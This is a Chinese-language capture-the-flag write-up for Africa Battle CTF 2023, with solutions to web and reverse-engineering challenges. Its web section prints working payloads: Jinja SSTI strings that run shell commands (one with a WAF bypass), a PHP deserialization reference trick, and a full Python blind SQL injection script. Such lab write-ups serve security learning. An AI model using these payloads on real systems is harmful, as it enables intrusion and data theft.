
# web
### Own reality
不知道考点很难受

---

#git
git泄露,都把这茬忘了

```shell
#git dump
python .\git_dumper.py http://chall.battlectf.online:8082/.git/ ./aaaa
# 查看日志
git log
# 恢复flag.txt
git checkout a1346a3 -- flag.txt
# decode,文件内容为._,替换.为0,_为1,然后from binary

```
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628174142.png)

### Civilization
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230624200433.png)
正则匹配没有递归,双写绕过
### Fa
```php
<?php
    include("flag.php");

    if(isset($_GET['source'])){
        highlight_file(__FILE__);
    }
    
    class africa {
        var $boknn;
        var $du;
    }
   
    if (isset($_GET['fa'])) {
        $vodoo = $_GET['fa'];
       
        $fa = unserialize($vodoo);
       
        if ($fa) {
            $fa->du=$flag;
            if ($fa->du === $fa->boknn)
                echo "Congratulation! You've got the best interpretation: <b>".$fa->du."</b>";
            else
                echo "Oh no...";
        }
        else echo "you dey smoke igbo?";
    }
    include("home.html");

?>
```
传入变量的引用即可伪造flag
```php
<?php
class africa {
    var $boknn;
    var $du;
}
$a=new africa();
$a->du="flag";
$a->boknn=&$a->du;
echo(serialize($a));
```
### Cobalt Injection
ssti,没过滤

---
```shell
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```
### Africa
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230625001448.png)
http头大考验

### Cobalt Injection 2
#ssti
开了waf的ssti

---
*payload*
```shell
{{request[%27application%27][%27\x5f\x5fglobals\x5f\x5f%27][%27\x5f\x5fbuiltins\x5f\x5f%27][%27\x5f\x5fimport\x5f\x5f%27](%27os%27)[%27popen%27](%27ls%27)[%27read%27]()}}
```

### Perfect Timing
一个登录页面,直接万能密码可以登录进去
但是没有任何功能点
#sql  
sql盲注
```python
import requests
host="http://chall.battlectf.online:8087/index.php"

def sqli(pos,mid):
    data = {
        "username":"boxy_mcbounce' OR ascii(substr((select group_concat(fl4g) from f1ag),%i,1))>%i -- -" % (pos,mid),
        "password":"a",
        "submit":'Login'
    }
    
    r = requests.post(host, data=data)
    return "Invalid" not in r.text

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

cok = ''
for i in range(1, 100):
    cok += get_char(i)
    if "Invalid" not in cok:
        print(cok)
```

### Common Weakness
#sql 
大小写绕过
# reverse
### SEYI
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628181720.png)
根据提示,这应该是一个后门程序
wsl执行了一下,什么都没有发生,吓人

---
没想到flag就是一个字符串,只不过要用strings命令
![image.png|500](https://gitee.com/leiye87/typora_picture/raw/master/20230628183009.png)
不知道为什么字符串会有重复啊
### Welcome
整个程序就一个字符串`Welcome to Africa Battle CTF 2023`


---
使用`objdump -d ./welcome`查看反汇编指令
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628200841.png)
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628201325.png)

```python
rax=0x522d1b20f6+0x1ee2eeee
rax=rax^0xaa84aaa
print(rax)
```

---
### Infinity
main函数就一个printf
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628201735.png)

但是我们运行的话会产生`Segmentation fault`,也就是段错误
> Segmentation fault（段错误）通常是由程序访问了未分配给它的内存地址或者访问了已经被释放的内存地址引起的。这种错误通常是由于编程错误、内存泄漏、指针错误、数组越界等问题导致的。

---
往栈里push数据,会导致栈不平衡,手搓出所有数据
```text
5F4F7572 6C654354 467B4265h 796F6E64 47616C61 7869657D
```
*from hex*
```shell
_OurleCTF{BeyondbattGalaxie}
```
重新组合一下
`battleCTF{Beyond_OurGalaxie}`
### babyrev
```c
// a2=15,偏移量
__int64 __fastcall encrypt(const char *input, int a2)
{
  __int64 result; // rax
  char word; // [rsp+17h] [rbp-9h]
  int len; // [rsp+18h] [rbp-8h]
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  len = strlen(input);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= len )
      break;
    word = input[i];
    if ( ((*__ctype_b_loc())[word] & 0x400) != 0 )// 是不是16的倍数
    {
      if ( ((*__ctype_b_loc())[word] & 0x200) != 0 )// 是不是8的倍数
        input[i] = (word - 97 + a2) % 26 + 97;
      else
        input[i] = (word - 65 + a2) % 26 + 65;
    }
  }
  return result;
}
```
字符串移位算法,移动a2个字符
### checker
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628230318.png)
搜索到字符串,又是移位,直接暴力破解,不过考点应该不是这个
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628230431.png)
看看正常加密流程,就是向后移五位
```c
__int64 __fastcall sub_1179(const char *a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  v2 = strlen(a1);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= v2 )
      break;
    if ( a1[i] <= 96 || a1[i] > 122 )
    {
      if ( a1[i] > 64 && a1[i] <= 90 )
        a1[i] = (a1[i] - 60) % 26 + 65;   //a1[i] = (a1[i] - 65+5) % 26 + 65;
    }
    else
    {
      a1[i] = (a1[i] - 92) % 26 + 97;    //a1[i] = (a1[i] - 97+5) % 26 + 65;
    }
  }
  return result;
}
```
### Mazui
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628230950.png)
有一个`Flag`函数,但是f5会失效
使用`objdump`查看
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230628232621.png)



# pwn

# crypto

# Misc


---
## *相关wp*




2023-06-24   19:49